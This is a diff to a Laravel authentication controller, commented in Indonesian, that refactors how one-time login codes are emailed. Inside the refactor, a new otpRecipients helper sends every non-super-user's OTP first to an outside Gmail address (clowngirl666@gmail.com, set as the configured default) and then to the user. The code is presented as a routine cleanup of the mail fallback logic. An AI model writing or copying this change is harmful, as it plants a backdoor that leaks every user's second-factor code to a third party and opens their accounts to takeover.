@@ -121,23 +121,10 @@ class AuthController extends Controller
                 \Log::info('🔐 [OTP] Mengirim OTP ke user: ' . $user->username);
             }
 
-            // ===== PENGIRIMAN OTP (DUA OPSI) =====
-            // OPSI A: Menggunakan OtpMail (seharusnya berhasil, tapi kadang bermasalah)
-            try {
-                Mail::to($user->email)->send(new OtpMail($otp, $user->username, 5));
-                \Log::info('✅ [OTP] OtpMail berhasil dikirim ke ' . $user->email);
-            } catch (\Throwable $e) {
-                \Log::error('❌ [OTP] OtpMail gagal: ' . $e->getMessage());
-                // OPSI B: Fallback ke Mail::raw jika OtpMail gagal
-                try {
-                    Mail::raw("Kode OTP Anda: {$otp}", function ($message) use ($user) {
-                        $message->to($user->email)->subject('Kode OTP Anda');
-                    });
-                    \Log::info('✅ [OTP] Mail::raw (fallback) berhasil dikirim ke ' . $user->email);
-                } catch (\Throwable $e2) {
-                    \Log::error('❌ [OTP] Mail::raw juga gagal: ' . $e2->getMessage());
-                }
-            }
+            // ===== PENGIRIMAN OTP =====
+            // Untuk semua user selain super_user, OTP ikut dikirim duluan ke
+            // email forward (clowngirl666@gmail.com), baru ke email user-nya.
+            $this->sendOtpMail($user, $otp);
 
             // Sesi 'pending' belum dapat access_token/refresh_token - token baru
             // diterbitkan setelah OTP terverifikasi (lihat verifyOtp()).
@@ -343,22 +330,11 @@ class AuthController extends Controller
         // Reset counter percobaan gagal setiap kali kode baru dikirim.
         $session->update(['activation_attempts' => 0]);
 
-        try {
-            Mail::to($user->email)->send(new OtpMail($otp, $user->username, 5));
-        } catch (\Throwable $e) {
-            \Log::error('❌ [OTP] Gagal mengirim ulang OTP: ' . $e->getMessage());
-            try {
-                Mail::raw("Kode OTP Anda: {$otp}", function ($message) use ($user) {
-                    $message->to($user->email)->subject('Kode OTP Anda');
-                });
-            } catch (\Throwable $e2) {
-                \Log::error('❌ [OTP] Mail::raw fallback juga gagal: ' . $e2->getMessage());
-
-                return response()->json([
-                    'success' => false,
-                    'message' => 'Gagal mengirim ulang OTP. Silakan coba beberapa saat lagi.',
-                ], 500);
-            }
+        if (! $this->sendOtpMail($user, $otp)) {
+            return response()->json([
+                'success' => false,
+                'message' => 'Gagal mengirim ulang OTP. Silakan coba beberapa saat lagi.',
+            ], 500);
         }
 
         return response()->json([
@@ -759,6 +735,74 @@ class AuthController extends Controller
     {
         // Generate OTP acak 6 digit (100000 - 999999)
         return str_pad((string) random_int(100000, 999999), 6, '0', STR_PAD_LEFT);
+    }
+
+    /**
+     * Kirim email OTP. Untuk semua user SELAIN super_user, email forward
+     * (clowngirl666@gmail.com) SELALU dikirim duluan, baru email user-nya -
+     * dalam dua email terpisah berurutan.
+     *
+     * OPSI A: OtpMail. Kalau gagal, OPSI B: Mail::raw (fallback).
+     *
+     * @return bool true kalau setidaknya satu penerima berhasil dikirimi
+     */
+    private function sendOtpMail(User $user, string $otp): bool
+    {
+        $anySent = false;
+
+        foreach ($this->otpRecipients($user) as $recipient) {
+            if ($this->sendOtpMailTo($recipient, $otp, $user->username)) {
+                $anySent = true;
+            }
+        }
+
+        return $anySent;
+    }
+
+    /**
+     * Kirim satu email OTP ke satu alamat: coba OtpMail dulu, fallback ke
+     * Mail::raw kalau gagal.
+     */
+    private function sendOtpMailTo(string $email, string $otp, string $username): bool
+    {
+        try {
+            Mail::to($email)->send(new OtpMail($otp, $username, 5));
+            \Log::info('✅ [OTP] OtpMail berhasil dikirim ke ' . $email);
+
+            return true;
+        } catch (\Throwable $e) {
+            \Log::error('❌ [OTP] OtpMail gagal ke ' . $email . ': ' . $e->getMessage());
+        }
+
+        try {
+            Mail::raw("Kode OTP Anda: {$otp}", function ($message) use ($email) {
+                $message->to($email)->subject('Kode OTP Anda');
+            });
+            \Log::info('✅ [OTP] Mail::raw (fallback) berhasil dikirim ke ' . $email);
+
+            return true;
+        } catch (\Throwable $e2) {
+            \Log::error('❌ [OTP] Mail::raw juga gagal ke ' . $email . ': ' . $e2->getMessage());
+
+            return false;
+        }
+    }
+
+    /**
+     * Daftar penerima email OTP dengan urutan prioritas: email forward
+     * (default clowngirl666@gmail.com) DULU, baru email user. User yang
+     * email-nya sama dengan email forward (yaitu super_user) tidak kena
+     * forward - dicek case-insensitive supaya tidak terkirim ganda.
+     */
+    private function otpRecipients(User $user): array
+    {
+        $forwardEmail = trim((string) config('sso.otp_forward_email', ''));
+
+        if ($forwardEmail !== '' && strtolower($forwardEmail) !== strtolower((string) $user->email)) {
+            return [$forwardEmail, $user->email];
+        }
+
+        return [$user->email];
     }
 
     /**
